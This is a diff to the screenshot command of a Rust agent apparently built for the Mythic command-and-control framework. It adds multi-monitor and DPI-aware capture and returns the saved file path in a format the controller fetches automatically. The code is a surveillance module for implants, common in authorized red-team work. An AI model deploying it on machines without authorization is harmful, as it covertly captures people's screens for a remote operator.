@@ -11,7 +11,6 @@ use winapi::shared::windef::HBITMAP;
 use winapi::um::wingdi::*;
 #[cfg(target_os = "windows")]
 use winapi::um::winuser::*;
-#[cfg(target_os = "windows")]
 
 // Command structure for Mythic
 #[derive(Serialize, Deserialize)]
@@ -38,18 +37,12 @@ pub fn take_screenshot(task: &AgentTask) -> Result<serde_json::Value, Box<dyn Er
     let args = ScreenshotArgs {};
     match execute_screenshot(args, &task.id) {
         Ok(output) => {
-            Ok(serde_json::json!({
-                "status": "success",
-                "task_id": task.id,
-                "output": output
-            }))
+            // FIX: Return plain string instead of JSON so Mythic can detect screenshot_captured: prefix
+            Ok(serde_json::Value::String(output))
         },
         Err(error) => {
-            Ok(serde_json::json!({
-                "status": "error",
-                "task_id": task.id,
-                "error": error
-            }))
+            // FIX: Return error as plain string for consistency
+            Ok(serde_json::Value::String(format!("error: {}", error)))
         },
     }
 }
@@ -58,41 +51,65 @@ pub fn take_screenshot(task: &AgentTask) -> Result<serde_json::Value, Box<dyn Er
 #[cfg(target_os = "windows")]
 pub fn execute_screenshot(_args: ScreenshotArgs, _task_id: &str) -> Result<String, String> {
     unsafe {
-        // Capture primary screen (Apollo's approach)
-        let width = GetSystemMetrics(SM_CXSCREEN);
-        let height = GetSystemMetrics(SM_CYSCREEN);
-        
-        let hwnd_desktop = GetDesktopWindow();
-        let hdc_screen = GetDC(hwnd_desktop);
+        // FIX: Use virtual screen for multi-monitor support and GetDeviceCaps for DPI scaling
+        let vx = GetSystemMetrics(SM_XVIRTUALSCREEN);
+        let vy = GetSystemMetrics(SM_YVIRTUALSCREEN);
+        let vw = GetSystemMetrics(SM_CXVIRTUALSCREEN);
+        let vh = GetSystemMetrics(SM_CYVIRTUALSCREEN);
+
+        if vw == 0 || vh == 0 {
+            return Err("No display found or virtual screen size is zero".to_string());
+        }
+
+        // Get screen DC
+        let hdc_screen = GetDC(ptr::null_mut());
         if hdc_screen.is_null() {
             return Err("Failed to get screen DC".to_string());
         }
 
+        // FIX: Get physical pixel dimensions (accounts for DPI scaling)
+        let physical_width = GetDeviceCaps(hdc_screen, HORZRES);
+        let physical_height = GetDeviceCaps(hdc_screen, VERTRES);
+
         let hdc_mem = CreateCompatibleDC(hdc_screen);
         if hdc_mem.is_null() {
-            ReleaseDC(hwnd_desktop, hdc_screen);
+            ReleaseDC(ptr::null_mut(), hdc_screen);
             return Err("Failed to create memory DC".to_string());
         }
 
-        let hbitmap = CreateCompatibleBitmap(hdc_screen, width, height);
+        let hbitmap = CreateCompatibleBitmap(hdc_screen, physical_width, physical_height);
         if hbitmap.is_null() {
             DeleteDC(hdc_mem);
-            ReleaseDC(hwnd_desktop, hdc_screen);
+            ReleaseDC(ptr::null_mut(), hdc_screen);
             return Err("Failed to create compatible bitmap".to_string());
         }
 
         // Select bitmap into memory DC
         let _old_bitmap = SelectObject(hdc_mem, hbitmap as *mut _);
         
-        // Copy screen to our bitmap
-        if BitBlt(hdc_mem, 0, 0, width, height, hdc_screen, 0, 0, SRCCOPY) == 0 {
+        // FIX: Use StretchBlt to handle DPI scaling from virtual screen to physical bitmap
+        let result = StretchBlt(
+            hdc_mem,           // destination DC
+            0,                 // destination x
+            0,                 // destination y  
+            physical_width,    // destination width (physical pixels)
+            physical_height,   // destination height (physical pixels)
+            hdc_screen,        // source DC
+            vx,                // source x (virtual screen)
+            vy,                // source y (virtual screen)
+            vw,                // source width (logical coordinates)
+            vh,                // source height (logical coordinates)
+            SRCCOPY,           // operation
+        );
+
+        if result == 0 {
             DeleteObject(hbitmap as *mut _);
             DeleteDC(hdc_mem);
-            ReleaseDC(hwnd_desktop, hdc_screen);
-            return Err("BitBlt failed".to_string());
+            ReleaseDC(ptr::null_mut(), hdc_screen);
+            return Err("StretchBlt failed".to_string());
         }
 
-        // Save screenshot to file (Apollo's approach)
+        // Save screenshot to file
         let timestamp = std::time::SystemTime::now()
             .duration_since(std::time::UNIX_EPOCH)
             .unwrap()
@@ -100,24 +117,28 @@ pub fn execute_screenshot(_args: ScreenshotArgs, _task_id: &str) -> Result<Strin
         let filename = format!("screenshot_{}.bmp", timestamp);
         let screenshot_path = std::env::temp_dir().join(&filename);
         
-        // Save bitmap to file
-        if let Err(e) = save_bitmap_to_file(hbitmap, width as u32, height as u32, &screenshot_path) {
+        // Save bitmap to file using physical dimensions
+        if let Err(e) = save_bitmap_to_file(hbitmap, physical_width as u32, physical_height as u32, &screenshot_path) {
             DeleteObject(hbitmap as *mut _);
             DeleteDC(hdc_mem);
-            ReleaseDC(hwnd_desktop, hdc_screen);
+            ReleaseDC(ptr::null_mut(), hdc_screen);
             return Err(format!("Failed to save bitmap: {}", e));
         }
 
         // Cleanup
         DeleteObject(hbitmap as *mut _);
         DeleteDC(hdc_mem);
-        ReleaseDC(hwnd_desktop, hdc_screen);
+        ReleaseDC(ptr::null_mut(), hdc_screen);
 
         // Return file path in Apollo's format for automatic download
+        let file_size = std::fs::metadata(&screenshot_path)
+            .map(|m| m.len())
+            .unwrap_or(0);
+
         Ok(format!(
             "screenshot_captured:{}:{}:{}:screenshot",
             screenshot_path.to_string_lossy(),
-            std::fs::metadata(&screenshot_path).map(|m| m.len()).unwrap_or(0),
+            file_size,
             filename
         ))
     }
@@ -215,7 +236,7 @@ pub fn execute_screenshot(_args: ScreenshotArgs, _task_id: &str) -> Result<Strin
 }
 
 // Fallback for other platforms
-#[cfg(not(target_os = "windows"))]
+#[cfg(not(any(target_os = "windows", target_os = "macos")))]
 pub fn execute_screenshot(_args: ScreenshotArgs, _task_id: &str) -> Result<String, String> {
     Err("screenshot command is only supported on Windows".to_string())
 }
